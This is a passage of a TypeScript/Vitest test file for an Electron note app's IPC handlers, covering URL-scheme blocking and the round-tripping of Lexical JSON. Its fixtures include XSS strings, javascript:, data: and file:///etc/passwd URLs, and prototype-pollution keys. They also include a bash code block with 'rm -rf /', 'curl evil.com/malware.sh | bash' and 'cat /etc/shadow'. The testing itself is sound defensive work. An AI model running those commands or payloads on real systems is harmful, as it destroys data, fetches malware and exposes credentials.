  //   - bookmark-component.tsx line 98: invoke("shell.openExternal", { url }) — NO .catch()

  it('shell.openExternal extracts url and passes to electron shell', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await handler(null, { url: 'https://example.com/page' });
    expect(shell.openExternal).toHaveBeenCalledWith('https://example.com/page');
    // Verify exactly 1 arg to shell.openExternal
    const callArgs = (shell.openExternal as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
  });

  it('shell.openExternal with http URL', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await handler(null, { url: 'http://legacy.example.com' });
    expect(shell.openExternal).toHaveBeenCalledWith('http://legacy.example.com');
  });

  // mailto: links — user Cmd+clicks an email link in a note.
  it('shell.openExternal with mailto URL', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await handler(null, { url: 'mailto:user@example.com' });
    expect(shell.openExternal).toHaveBeenCalledWith('mailto:user@example.com');
  });

  // The handler returns { ok: true } — Electron's shell.openExternal returns void.
  it('shell.openExternal response is { ok: true }', async () => {
    const handler = handlers.get('shell.openExternal')!;
    const result = await handler(null, { url: 'https://example.com' });
    expect(result).toEqual({ ok: true });
  });

  // URL with special characters — real links from user notes.
  it('shell.openExternal with URL containing query params and fragment', async () => {
    const handler = handlers.get('shell.openExternal')!;
    const url = 'https://example.com/search?q=hello+world&lang=en#results';
    await handler(null, { url });
    expect(shell.openExternal).toHaveBeenCalledWith(url);
  });

  // Dangerous URL schemes are now rejected at the IPC layer.
  it('shell.openExternal rejects file:// URL', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: 'file:///etc/passwd' })).rejects.toThrow('Blocked URL scheme');
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  it('shell.openExternal rejects javascript: URL', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: 'javascript:alert(document.cookie)' })).rejects.toThrow('Blocked URL scheme');
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  // Unrecognized schemes are blocked before reaching shell.openExternal.
  it('shell.openExternal rejects unrecognized URL scheme', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: 'bad://scheme' })).rejects.toThrow(
      'Blocked URL scheme: bad',
    );
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  // ────────────────────────────────────────────────────────
  // url.resolve — from link-click-plugin.tsx handleEmbed()
  // ────────────────────────────────────────────────────────

  // link-click-plugin.tsx line 243: invoke("url.resolve", { url })
  // url comes from hoverState.url, which is the href of the hovered link.

  it('url.resolve extracts url and passes to resolveUrl', async () => {
    const handler = handlers.get('url.resolve')!;
    await handler(null, { url: 'https://example.com/photo.png' });
    expect(urlResolver.resolveUrl).toHaveBeenCalledWith('https://example.com/photo.png');
    // Verify exactly 1 arg
    const callArgs = (urlResolver.resolveUrl as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(callArgs.length).toBe(1);
  });

  // User pastes a URL with trailing whitespace from their clipboard.
  it('url.resolve passes url through as-is (no trimming in handler)', async () => {
    const handler = handlers.get('url.resolve')!;
    await handler(null, { url: '  https://example.com  ' });
    expect(urlResolver.resolveUrl).toHaveBeenCalledWith('  https://example.com  ');
  });

  // URL with unicode characters (internationalized domain name).
  it('url.resolve with unicode URL', async () => {
    const handler = handlers.get('url.resolve')!;
    await handler(null, { url: 'https://例え.jp/画像.png' });
    expect(urlResolver.resolveUrl).toHaveBeenCalledWith('https://例え.jp/画像.png');
  });

  // The response can be either { type: 'image', ... } or { type: 'unsupported', ... }.
  // The frontend checks result.type to decide what to do.
  it('url.resolve passes through image result', async () => {
    (urlResolver.resolveUrl as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      type: 'image', id: 'img-1', filePath: 'img-1.png', sourceUrl: 'https://example.com/img.png',
    });
    const handler = handlers.get('url.resolve')!;
    const result = await handler(null, { url: 'https://example.com/img.png' }) as { type: string };
    expect(result.type).toBe('image');
  });

  it('url.resolve passes through unsupported result', async () => {
    const handler = handlers.get('url.resolve')!;
    const result = await handler(null, { url: 'https://example.com/article' }) as { type: string };
    expect(result.type).toBe('unsupported');
  });

  // ────────────────────────────────────────────────────────
  // url.fetchMetadata — from link-click-plugin.tsx
  // ────────────────────────────────────────────────────────

  // Called from two places:
  //   - handleEmbed (line 260): fallback after url.resolve returns unsupported
  //   - handleBookmark (line 302): direct metadata fetch for bookmark creation

  it('url.fetchMetadata extracts url and passes to fetchUrlMetadata', async () => {
    const handler = handlers.get('url.fetchMetadata')!;
    await handler(null, { url: 'https://example.com/article' });
    expect(urlMetadata.fetchUrlMetadata).toHaveBeenCalledWith('https://example.com/article');
  });

  // The response fields are used to populate the bookmark/embed node.
  it('url.fetchMetadata response has all fields the frontend uses', async () => {
    (urlMetadata.fetchUrlMetadata as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      title: 'Example Article',
      description: 'An example description',
      imageUrl: 'https://example.com/og.png',
      faviconUrl: 'https://example.com/favicon.ico',
      url: 'https://example.com/article',
    });
    const handler = handlers.get('url.fetchMetadata')!;
    const result = await handler(null, { url: 'https://example.com/article' }) as Record<string, unknown>;
    expect(result.title).toBe('Example Article');
    expect(result.description).toBe('An example description');
    expect(result.imageUrl).toBe('https://example.com/og.png');
    expect(result.faviconUrl).toBe('https://example.com/favicon.ico');
    expect(result.url).toBe('https://example.com/article');
  });

  // ────────────────────────────────────────────────────────
  // Response shape integrity — exact key verification
  // ────────────────────────────────────────────────────────

  // The frontend destructures specific fields from every response.
  // If the handler wraps the result in the wrong key (e.g., { doc } instead
  // of { document }), the destructured value is undefined and crashes.

  it('documents.list response has exactly { documents } key', async () => {
    const handler = handlers.get('documents.list')!;
    const result = await handler(null, {}) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['documents']);
    expect(Array.isArray(result.documents)).toBe(true);
  });

  it('documents.listTrashed response has exactly { documents } key', async () => {
    const handler = handlers.get('documents.listTrashed')!;
    const result = await handler(null, {}) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['documents']);
    expect(Array.isArray(result.documents)).toBe(true);
  });

  it('documents.create response has exactly { document } key', async () => {
    const handler = handlers.get('documents.create')!;
    const result = await handler(null, {}) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['document']);
  });

  it('documents.update response has exactly { document } key', async () => {
    const handler = handlers.get('documents.update')!;
    const result = await handler(null, { id: '1', title: 'X' }) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['document']);
  });

  it('documents.get response has exactly { document } key', async () => {
    const handler = handlers.get('documents.get')!;
    const result = await handler(null, { id: '1' }) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['document']);
  });

  it('documents.move response has exactly { document } key', async () => {
    const handler = handlers.get('documents.move')!;
    const result = await handler(null, { id: '1', parentId: null, sortOrder: 0 }) as Record<string, unknown>;
    expect(Object.keys(result)).toEqual(['document']);
  });

  it('documents.trash response has document and trashedIds keys', async () => {
    const handler = handlers.get('documents.trash')!;
    const result = await handler(null, { id: '1' }) as Record<string, unknown>;
    expect(result).toHaveProperty('document');
    expect(result).toHaveProperty('trashedIds');
    expect(Array.isArray(result.trashedIds)).toBe(true);
  });

  it('documents.restore response has document and restoredIds keys', async () => {
    const handler = handlers.get('documents.restore')!;
    const result = await handler(null, { id: '1' }) as Record<string, unknown>;
    expect(result).toHaveProperty('document');
    expect(result).toHaveProperty('restoredIds');
    expect(Array.isArray(result.restoredIds)).toBe(true);
  });

  it('documents.permanentDelete response has deletedIds key', async () => {
    const handler = handlers.get('documents.permanentDelete')!;
    const result = await handler(null, { id: '1' }) as Record<string, unknown>;
    expect(result).toHaveProperty('deletedIds');
    expect(Array.isArray(result.deletedIds)).toBe(true);
  });

  it('documents.delete response is exactly { ok: true }', async () => {
    const handler = handlers.get('documents.delete')!;
    const result = await handler(null, { id: '1' });
    expect(result).toEqual({ ok: true });
  });

  it('images.delete response is exactly { ok: true }', async () => {
    const handler = handlers.get('images.delete')!;
    const result = await handler(null, { id: 'img1' });
    expect(result).toEqual({ ok: true });
  });

  it('shell.openExternal response is exactly { ok: true }', async () => {
    const handler = handlers.get('shell.openExternal')!;
    const result = await handler(null, { url: 'https://example.com' });
    expect(result).toEqual({ ok: true });
  });

  it('images.save response has id and filePath', async () => {
    const handler = handlers.get('images.save')!;
    const result = await handler(null, { data: 'abc', mimeType: 'image/png' }) as Record<string, unknown>;
    expect(result).toHaveProperty('id');
    expect(result).toHaveProperty('filePath');
  });

  it('images.download response has id and filePath', async () => {
    const handler = handlers.get('images.download')!;
    const result = await handler(null, { url: 'https://example.com/img.png' }) as Record<string, unknown>;
    expect(result).toHaveProperty('id');
    expect(result).toHaveProperty('filePath');
  });

  it('images.getPath response has filePath', async () => {
    const handler = handlers.get('images.getPath')!;
    const result = await handler(null, { id: 'img1' }) as Record<string, unknown>;
    expect(result).toHaveProperty('filePath');
  });
});

// ════════════════════════════════════════════════════════════════
// Complex JSON Payload Edge Cases
//
// The Lexical editor serializes document content as deeply nested JSON.
// Real notes contain images, code blocks, bookmarks, links, checkboxes,
// nested lists, and all of these mixed together. The IPC layer passes
// this JSON through to the database. These tests verify:
//
// 1. Complex real-world Lexical JSON shapes survive the round-trip intact
// 2. Pathological/malicious JSON SHOULD be handled safely
// 3. Content integrity: what goes in must come out unchanged
// 4. The handler+repo layer doesn't mangle, truncate, or inject
//
// The "SHOULD" tests (marked it.todo) document desired validation that
// hasn't been implemented yet. When the validation is added, convert
// them back to regular tests.
// ════════════════════════════════════════════════════════════════

describe('Complex JSON Payload Edge Cases', () => {
  beforeEach(() => {
    handlers.clear();
    vi.clearAllMocks();
    registerIpcHandlers();
  });

  // ── Realistic Lexical Document Structures ──────────────────

  // A full Lexical document with every custom node type Lychee supports:
  // title, paragraph, image, code-block, bookmark, list-items with
  // links, heading, quote, horizontal rule.
  it('documents.update with every Lexical node type in one document', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          // Title node (always first in Lychee)
          {
            type: 'title', version: 1,
            children: [{ type: 'text', text: 'My Complete Note', format: 0, mode: 'normal' }],
            direction: 'ltr', format: '', indent: 0,
          },
          // Heading
          {
            type: 'heading', tag: 'h2', version: 1,
            children: [{ type: 'text', text: 'Section One', format: 1 }],
            direction: 'ltr', format: '', indent: 0,
          },
          // Paragraph with mixed formatting
          {
            type: 'paragraph', version: 1,
            children: [
              { type: 'text', text: 'Normal text, ', format: 0, mode: 'normal' },
              { type: 'text', text: 'bold', format: 1, mode: 'normal' },
              { type: 'text', text: ', ', format: 0, mode: 'normal' },
              { type: 'text', text: 'italic', format: 2, mode: 'normal' },
              { type: 'text', text: ', ', format: 0, mode: 'normal' },
              { type: 'code', text: 'inline code', format: 0, mode: 'normal' },
            ],
            direction: 'ltr', format: '', indent: 0,
          },
          // Image node (decorator, no children)
          {
            type: 'image', version: 1,
            imageId: 'img-uuid-abc123',
            altText: 'Screenshot of the app',
            width: 1920, height: 1080,
            alignment: 'center',
            sourceUrl: 'https://cdn.example.com/screenshot.png',
          },
          // Code block (decorator, no children)
          {
            type: 'code-block', version: 1,
            code: 'def fibonacci(n):\n    if n <= 1:\n        return n\n    return fibonacci(n-1) + fibonacci(n-2)\n\nprint(fibonacci(10))',
            language: 'python',
          },
          // Quote block
          {
            type: 'quote', version: 1,
            children: [
              {
                type: 'paragraph', version: 1,
                children: [{ type: 'text', text: 'The only way to do great work is to love what you do.', format: 2, mode: 'normal' }],
                direction: 'ltr', format: '', indent: 0,
              },
            ],
            direction: 'ltr', format: '', indent: 0,
          },
          // Horizontal rule
          { type: 'horizontalrule', version: 1 },
          // Bullet list items (flat list model with indent)
          {
            type: 'list-item', version: 1, listType: 'bullet', checked: false, indent: 0,
            children: [{ type: 'text', text: 'First item', format: 0 }],
            direction: 'ltr', format: '',
          },
          {
            type: 'list-item', version: 1, listType: 'bullet', checked: false, indent: 1,
            children: [
              { type: 'text', text: 'Nested item with ', format: 0 },
              {
                type: 'link', url: 'https://example.com', target: '_blank', version: 1,
                children: [{ type: 'text', text: 'a link', format: 0 }],
              },
            ],
            direction: 'ltr', format: '',
          },
          // Checkbox list items
          {
            type: 'list-item', version: 1, listType: 'check', checked: true, indent: 0,
            children: [{ type: 'text', text: 'Completed task', format: 0 }],
            direction: 'ltr', format: '',
          },
          {
            type: 'list-item', version: 1, listType: 'check', checked: false, indent: 0,
            children: [{ type: 'text', text: 'Pending task', format: 0 }],
            direction: 'ltr', format: '',
          },
          // Bookmark node (decorator, no children)
          {
            type: 'bookmark', version: 1,
            url: 'https://github.com/facebook/lexical',
            title: 'Lexical - An extensible text editor framework',
            description: 'Lexical is an extensible JavaScript web text-editor framework',
            imageUrl: 'https://repository-images.githubusercontent.com/github/lexical.png',
            faviconUrl: 'https://github.com/favicon.ico',
          },
          // Numbered list items
          {
            type: 'list-item', version: 1, listType: 'number', checked: false, indent: 0,
            children: [{ type: 'text', text: 'Step one', format: 0 }],
            direction: 'ltr', format: '',
          },
          {
            type: 'list-item', version: 1, listType: 'number', checked: false, indent: 0,
            children: [{ type: 'text', text: 'Step two', format: 0 }],
            direction: 'ltr', format: '',
          },
        ],
        type: 'root', version: 1, direction: 'ltr', format: '', indent: 0,
      },
    });
    const payload = { id: 'full-doc', content };
    await handler(null, payload);
    // Entire complex JSON must survive intact
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
    // Verify parse-ability
    const parsed = JSON.parse(received);
    expect(parsed.root.children).toHaveLength(14);
    expect(parsed.root.children[0].type).toBe('title');
    expect(parsed.root.children[3].type).toBe('image');
    expect(parsed.root.children[4].type).toBe('code-block');
    expect(parsed.root.children[11].type).toBe('bookmark');
  });

  // Image node referencing a real imageId — the ID connects the Lexical
  // JSON to the images table. If this ID gets mangled, the image breaks.
  it('image node imageId survives round-trip unchanged', async () => {
    const handler = handlers.get('documents.update')!;
    const imageId = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890';
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'image', version: 1,
            imageId,
            altText: 'Test image',
            width: 800, height: 600,
            sourceUrl: 'https://cdn.example.com/photo.jpg',
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'img-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children[0].imageId).toBe(imageId);
  });

  // Code block with multi-language content — code blocks can contain
  // any programming language including characters that could break JSON
  // if not properly escaped (backslashes, quotes, template literals).
  it('code-block node with tricky code content survives round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const code = [
      'const regex = /["\']\\\\n/g;',
      'const template = `Hello ${name}\\n${JSON.stringify({"key": "value"})}`;',
      "const sql = \"SELECT * FROM docs WHERE title = 'O\\'Brien'\";",
      'console.log("line1\\nline2\\ttab");',
      '// Special: 日本語コメント 🎌',
    ].join('\n');
    const content = JSON.stringify({
      root: {
        children: [
          { type: 'code-block', version: 1, code, language: 'javascript' },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'code-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children[0].code).toBe(code);
    expect(received.root.children[0].language).toBe('javascript');
  });

  // Bookmark node with URLs containing special characters — query params,
  // fragments, encoded characters, unicode paths.
  it('bookmark node URLs with special characters survive round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'bookmark', version: 1,
            url: 'https://example.com/search?q=hello+world&lang=日本語#résultats',
            title: 'Search "Results" <b>for</b> & more',
            description: "A page about O'Brien's <script>alert('xss')</script> work",
            imageUrl: 'https://cdn.example.com/og.png?w=1200&h=630',
            faviconUrl: '//cdn.example.com/favicon.ico',
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'bookmark-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    const bookmark = received.root.children[0];
    expect(bookmark.url).toContain('日本語');
    expect(bookmark.title).toContain('"Results"');
    expect(bookmark.description).toContain("<script>alert('xss')</script>");
  });

  // ── Deeply Nested Structures ───────────────────────────────

  // A deeply nested JSON structure — 100 levels of nesting.
  // Lexical doesn't produce this, but a malicious or buggy client could.
  // The handler SHOULD pass it through (SQLite stores it fine) but
  // JSON.parse has a default recursion limit around ~1000 levels.
  it('deeply nested JSON (100 levels) survives round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    let inner: Record<string, unknown> = { type: 'text', text: 'leaf', format: 0 };
    for (let i = 0; i < 100; i++) {
      inner = {
        type: 'paragraph', version: 1,
        children: [inner],
        direction: 'ltr', format: '', indent: 0,
      };
    }
    const content = JSON.stringify({
      root: { children: [inner], type: 'root', version: 1 },
    });
    await handler(null, { id: 'deep-doc', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
    // Sanity: 100 levels of nesting produces a non-trivial payload
    expect(received.length).toBeGreaterThan(5000);
  });

  // Wide JSON — a single paragraph with 1000 inline children (mixed text
  // and links). This simulates a user who pastes a massive amount of
  // formatted text from the web.
  it('wide JSON (1000 inline children) survives round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const children = Array.from({ length: 1000 }, (_, i) =>
      i % 3 === 0
        ? { type: 'link', url: `https://example.com/${i}`, version: 1, children: [{ type: 'text', text: `link-${i}` }] }
        : { type: 'text', text: `word-${i} `, format: i % 4 },
    );
    const content = JSON.stringify({
      root: {
        children: [{ type: 'paragraph', version: 1, children }],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'wide-doc', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
    const parsed = JSON.parse(received);
    expect(parsed.root.children[0].children).toHaveLength(1000);
  });

  // A note with 50 images — simulates a photo album or documentation page.
  // Each image has a unique imageId. All must survive the round-trip.
  it('50 image nodes with unique imageIds all survive round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const imageNodes = Array.from({ length: 50 }, (_, i) => ({
      type: 'image', version: 1,
      imageId: `img-${String(i).padStart(3, '0')}-${Date.now()}`,
      altText: `Image ${i}`,
      width: 800 + i, height: 600 + i,
      sourceUrl: `https://cdn.example.com/photo-${i}.jpg`,
    }));
    const content = JSON.stringify({
      root: { children: imageNodes, type: 'root', version: 1 },
    });
    await handler(null, { id: 'album-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children).toHaveLength(50);
    // Every imageId preserved
    for (let i = 0; i < 50; i++) {
      expect(received.root.children[i].imageId).toBe(imageNodes[i].imageId);
    }
  });

  // ── Malicious / Pathological Content ──────────────────────

  // Content containing embedded HTML script tags — XSS attempt via
  // the JSON content field. The handler passes it through as a string,
  // but the system SHOULD sanitize HTML in text nodes before rendering.
  it('XSS in text nodes passes through handler (rendering must sanitize)', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [
              { type: 'text', text: '<script>document.cookie</script>', format: 0 },
              { type: 'text', text: '<img src=x onerror=alert(1)>', format: 0 },
              { type: 'text', text: '"><svg onload=alert(1)>', format: 0 },
            ],
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'xss-doc', content });
    // Handler passes through — XSS prevention is the renderer's job
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toBe(content);
  });

  // Prototype pollution attempt via __proto__ and constructor keys.
  // JSON.parse doesn't execute prototype pollution, but if the handler
  // or repo ever uses Object.assign or spread on parsed content,
  // these keys could be dangerous.
  it('prototype pollution keys in JSON content survive as plain data', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [{ type: 'text', text: 'normal text' }],
            __proto__: { isAdmin: true },
            constructor: { prototype: { isAdmin: true } },
          },
        ],
        type: 'root', version: 1,
        __proto__: { polluted: true },
      },
    });
    await handler(null, { id: 'proto-doc', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    // Content stored as string — no prototype pollution risk in storage
    expect(received).toBe(content);
  });

  // Content that is valid JSON but not a valid Lexical editor state.
  // Missing the `root` key, or root has no `children`, or children
  // contains non-node objects. The handler currently passes it through
  // — the editor validates on load. But the IPC layer SHOULD validate
  // that content has the basic structure.
  it('should reject content without root key (invalid editor state)', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({ nodes: [], version: 1 });
    await expect(handler(null, { id: 'no-root', content })).rejects.toThrow('content must have a root key');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  it('should reject content where root.children is not an array', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({ root: { children: 'not-an-array', type: 'root' } });
    await expect(handler(null, { id: 'bad-children', content })).rejects.toThrow('content root.children must be an array');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  it('should reject content that is not valid JSON at all', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { id: 'bad-json', content: '{not valid json}' })).rejects.toThrow('content is not valid JSON');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // A code-block with executable shell commands — a local note-taking app
  // stores these as data, but if content is ever evaluated or interpolated,
  // this could be dangerous. The handler SHOULD treat code content as opaque.
  it('code-block with dangerous shell commands stored as inert data', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'code-block', version: 1,
            code: 'rm -rf / --no-preserve-root\ncurl evil.com/malware.sh | bash\ncat /etc/shadow',
            language: 'bash',
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'danger-code', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    // Code content must be stored verbatim — it's the user's data
    expect(received.root.children[0].code).toContain('rm -rf /');
  });

  // Link URLs with dangerous schemes embedded in the Lexical JSON.
  // The editor stores whatever the user types. The renderer SHOULD
  // validate URLs before navigating, but the handler passes through.
  it('link nodes with dangerous URL schemes pass through handler', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [
              {
                type: 'link', version: 1,
                url: 'javascript:alert(document.cookie)',
                children: [{ type: 'text', text: 'Click me' }],
              },
              {
                type: 'link', version: 1,
                url: 'data:text/html,<script>alert(1)</script>',
                children: [{ type: 'text', text: 'Data URL' }],
              },
              {
                type: 'link', version: 1,
                url: 'file:///etc/passwd',
                children: [{ type: 'text', text: 'Local file' }],
              },
            ],
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'bad-links', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    // All link URLs preserved verbatim — URL validation is the renderer's job
    expect(received.root.children[0].children[0].url).toBe('javascript:alert(document.cookie)');
    expect(received.root.children[0].children[1].url).toBe('data:text/html,<script>alert(1)</script>');
    expect(received.root.children[0].children[2].url).toBe('file:///etc/passwd');
  });

  // Image node with a manipulated sourceUrl pointing to a local file.
  // The renderer uses this URL only as metadata, but if it's ever
  // fetched without validation, this could leak local files.
  it('image node with file:// sourceUrl stored as data', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'image', version: 1,
            imageId: 'img-legit',
            altText: 'Normal image',
            sourceUrl: 'file:///Users/victim/Documents/secrets.pdf',
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'file-img', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children[0].sourceUrl).toBe('file:///Users/victim/Documents/secrets.pdf');
  });

  // ── Content Integrity Under Stress ─────────────────────────

  // Content with every Unicode plane — BMP, SMP (emoji), SIP (CJK).
  // SQLite stores UTF-8 natively, but if any layer does encoding
  // conversion, characters could be corrupted.
  it('multi-plane Unicode content survives round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [
              // BMP: Latin, CJK, Arabic
              { type: 'text', text: 'Hello 世界 مرحبا Привет', format: 0 },
              // SMP: Emoji
              { type: 'text', text: '👨‍👩‍👧‍👦 🏳️‍🌈 🇯🇵 🧑🏽‍💻', format: 0 },
              // Mathematical symbols (SMP)
              { type: 'text', text: '𝕳𝖊𝖑𝖑𝖔 𝔽𝕣𝕒𝕜𝕥𝕦𝕣', format: 0 },
              // Musical symbols
              { type: 'text', text: '𝄞 𝄢 𝅘𝅥𝅮', format: 0 },
            ],
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'unicode-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children[0].children[0].text).toBe('Hello 世界 مرحبا Привет');
    expect(received.root.children[0].children[1].text).toContain('👨‍👩‍👧‍👦');
    expect(received.root.children[0].children[2].text).toContain('𝕳');
  });

  // Content with null bytes embedded in text nodes.
  // Null bytes are valid in JavaScript strings but can cause issues
  // in C-based string handling (SQLite). They SHOULD be preserved
  // since users can paste arbitrary content.
  it('null bytes in text content survive round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const textWithNulls = 'before\0middle\0after';
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [{ type: 'text', text: textWithNulls }],
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'null-doc', content });
    const received = (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content;
    expect(received).toContain('\\u0000');
    // JSON.stringify converts \0 to \u0000 — verify round-trip through parse
    const parsed = JSON.parse(received);
    expect(parsed.root.children[0].children[0].text).toBe(textWithNulls);
  });

  // Content with very long text in a single node — 1MB of text in one paragraph.
  // This simulates pasting a massive document from another source.
  it('single text node with 1MB of content survives round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const longText = 'A'.repeat(1024 * 1024);
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [{ type: 'text', text: longText }],
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'long-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children[0].children[0].text.length).toBe(1024 * 1024);
  });

  // JSON content with all possible escape sequences — backslash, quotes,
  // newlines, tabs, unicode escapes. These are the sequences that break
  // naive string handling.
  it('all JSON escape sequences in text content survive round-trip', async () => {
    const handler = handlers.get('documents.update')!;
    const tricky = 'tab:\there\nnewline\rcarriage\fform\bbackspace\\backslash"quotes"';
    const content = JSON.stringify({
      root: {
        children: [
          {
            type: 'paragraph', version: 1,
            children: [{ type: 'text', text: tricky }],
          },
        ],
        type: 'root', version: 1,
      },
    });
    await handler(null, { id: 'escape-doc', content });
    const received = JSON.parse(
      (docs.updateDocument as ReturnType<typeof vi.fn>).mock.calls[0][1].content,
    );
    expect(received.root.children[0].children[0].text).toBe(tricky);
  });

  // ── Aspirational Validation Tests ──────────────────────────
  // These test what the IPC layer SHOULD do but doesn't yet.

  // The handler validates that `id` is present in update payloads.
  it('should reject documents.update without id field', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { content: '{}' })).rejects.toThrow('Missing required field: id');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // Content validation rejects non-JSON strings in the update handler.
  it('should reject documents.update with content that is not valid JSON', async () => {
    const handler = handlers.get('documents.update')!;
    await expect(handler(null, { id: 'bad-json', content: 'this is not JSON' })).rejects.toThrow('content is not valid JSON');
    expect(docs.updateDocument).not.toHaveBeenCalled();
  });

  // The handler validates image MIME types before passing to saveImage.
  it('should reject images.save with mimeType not in the allowlist', async () => {
    const handler = handlers.get('images.save')!;
    await expect(handler(null, { data: 'abc', mimeType: 'text/html' })).rejects.toThrow('Unsupported image type');
    expect(images.saveImage).not.toHaveBeenCalled();
  });

  // The handler validates that URLs for images.download are http/https.
  it('should reject images.download with non-http URL schemes', async () => {
    const handler = handlers.get('images.download')!;
    await expect(handler(null, { url: 'file:///etc/passwd' })).rejects.toThrow('Blocked URL scheme for image download');
    await expect(handler(null, { url: 'data:image/png;base64,abc' })).rejects.toThrow('Blocked URL scheme for image download');
    expect(images.downloadImage).not.toHaveBeenCalled();
  });

  // The handler validates that URLs for shell.openExternal are http/https or mailto.
  it('should reject shell.openExternal with javascript: URL', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: 'javascript:alert(1)' })).rejects.toThrow('Blocked URL scheme');
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  it('should reject shell.openExternal with file:// URL', async () => {
    const handler = handlers.get('shell.openExternal')!;
    await expect(handler(null, { url: 'file:///etc/passwd' })).rejects.toThrow('Blocked URL scheme');
    expect(shell.openExternal).not.toHaveBeenCalled();
  });

  // The handler validates that sortOrder is a non-negative integer.
  it('should reject documents.move with negative sortOrder', async () => {
    const handler = handlers.get('documents.move')!;
    await expect(handler(null, { id: 'd1', parentId: null, sortOrder: -1 })).rejects.toThrow('sortOrder must be non-negative');
    expect(docs.moveDocument).not.toHaveBeenCalled();
  });

  it('should reject documents.move with fractional sortOrder', async () => {
